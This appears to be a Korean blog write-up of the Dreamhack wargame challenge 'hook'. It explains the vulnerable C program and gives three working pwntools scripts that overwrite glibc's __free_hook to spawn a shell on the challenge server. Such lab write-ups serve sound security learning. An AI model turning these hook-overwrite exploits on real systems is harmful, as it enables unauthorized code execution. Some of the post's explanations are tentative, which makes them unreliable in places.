---
layout: post
title: [Dreamhack] hook 
subtitle: Dreamhack-Pwnable hook
categories: Pwnable
tags: [Pwnable, dreakhack, Shell, Pentest]
---

**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://dreamhack.io/wargame/challenges/">dreamhack.io</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/201270726-166afd16-6247-4909-971f-75e38c87eca6.jpg" width = 550>
</p>

## 문제 풀이

이번 문제도 **Full RELRO**로 인해서 Now binding, 프로그램이 실행될 때 해당 프로그램에서 사용되는 함수들의 주소를 읽어와 GOT 영역에 저장하기에, GOT Overwrite가 불가능하다. 또한, Canary가 있기에 leak이 가능할 지 확인을 해야한다.

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    long *ptr;
    size_t size;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("Size: ");
    scanf("%ld", &size);

    ptr = malloc(size);

    printf("Data: ");
    read(0, ptr, size);

    *(long *)*ptr = *(ptr+1);

    free(ptr);
    free(ptr);

    system("/bin/sh");
    return 0;
}
```

```C
printf("stdout: %p\n", stdout);

printf("Size: ");
scanf("%ld", &size);

ptr = malloc(size);
```

* 처음에 `stdout`의 메모리 주소를 출력해주는 것으로 보아 해당 값을 통해서 libc_base 주소를 찾으면 될 것으로 예상된다.

* `size`를 입력받아 그 만큼의 크기를 `ptr`에 할당해준다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/201009026-d632c342-9f7b-4161-84de-eec9f6408e2c.jpg" width = 500>
</p>

* `stdout`라는 함수는 `_IO_2_1_stdout_`라는 이름을 가지고 있기에 libc_base를 구할 때 해당 이름으로 구해야 한다.

```C
printf("Data: ");
read(0, ptr, size);

*(long *)*ptr = *(ptr+1);
```

* 할당받은 `ptr`에 입력받은 `size`만큼 read()가 가능하다. 

* **\*\*ptr**에는 **[ptr+1]** 즉, **ptr+0x8**의 값이 들어가있다._(하지만, 어떻게 작용이 되는지 이해를 하지 못했다.)_

```C
free(ptr);
free(ptr);

system("/bin/sh");
return 0;
```

* `free(ptr)`를 두 번하여 **double free detected**로 프로그램이 강제 종료된다.

  * ~~_하지만, 실질적으로는 `*(long *)*ptr = *(ptr+1);`에서 segmetation fault로 프로그램이 종료된다._~~

* 따라서, `system("/bin/sh");`를 실행하지 못한다.

* `free()`함수에는 **__free_hook**이 있기에 Hook overwrite가 가능할 것이다.

## 1st. Exploit

```python
from pwn import *

p = remote('host3.dreamhack.games', 14260)
# p = process('./hook')
e = ELF('./hook')
libc = ELF('./libc.so.6')

p.recvuntil('stdout: ')
stdout = int(p.recv(14), 16)

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']

one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

og = libc_base + one_gadget[1]

payload = p64(free_hook) + p64(og)
p.sendlineafter('Size: ', '500') # any values
p.sendlineafter('Data: ', payload)

p.interactive()
```

## 2nd. Exploit

소스코드를 보면 `system("/bin/sh");`이 존재한다. 그리고 `*(long *)*ptr = *(ptr+1);` 입력받은 값에 대해 다음 Byte를 저장하는 로직도 존재한다.

그렇다면, `system`을 호출하는 이전 메모리의 값을 넣고 전달한다면 이 다음의 메모리를 가져오기에 `system` 호출이 가능하다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/201584984-dcd168a8-d70e-4c40-ac4a-693c5d67d486.jpg" width = 550>
</p>

`ptr`에는 **0x400a11**의 주소가 들어가 이후에는 해당 메모리부터 순회하기에 **0x400a16**로 인한 System Call이 이루어진다.

```python
from pwn import *

p = remote('host3.dreamhack.games', 14260)
# p = process('./hook')
e = ELF('./hook')
libc = ELF('./libc.so.6')

p.recvuntil('stdout: ')
stdout = int(p.recv(14), 16)

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']
system = 0x400a11

payload = p64(free_hook) + p64(system)
p.sendlineafter('Size: ', '500') # any values
p.sendlineafter('Data: ', payload)

p.interactive()
```

## 3rd. Exploit

이번 방법은 `free(ptr)`가 두 번 있기에 **double free detected in tcache 2** 같은 영역 두 번 초기화에 대한 에러를 우회하는 방법이다.

단순히 `free()`함수를 실행하지 못하게 혹은 다른 함수로 대체하여 가장 마지막에 위하고 있는 `system("/bin/sh")`이 가능하게 하는 방법이다.

단순하게 `free()` 함수를 `__free_hook`을 통해 변환하기 가장 좋은 방법은 **put** 함수다. free 함수와 마찬가지로 인자가 하나만 필요하기에 **put**을 Hook Overwriting 하면 문제를 쉽게 풀 수 있다.

```python
from pwn import *

def log(a, b): return success(': '.join([a, hex(b)]))

p = process('./hook')
e = ELF('./hook')
libc = ELF('./libc.so.6')

puts_plt = e.plt['puts']

p.recvuntil('stdout: ')
stdout = int(p.recv(14), 16)

libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
free_hook = libc_base + libc.symbols['__free_hook']

payload = p64(free_hook) + p64(puts_plt)
p.sendlineafter('Size: ', '500')
p.sendlineafter('Data: ', payload)

p.interactive()
```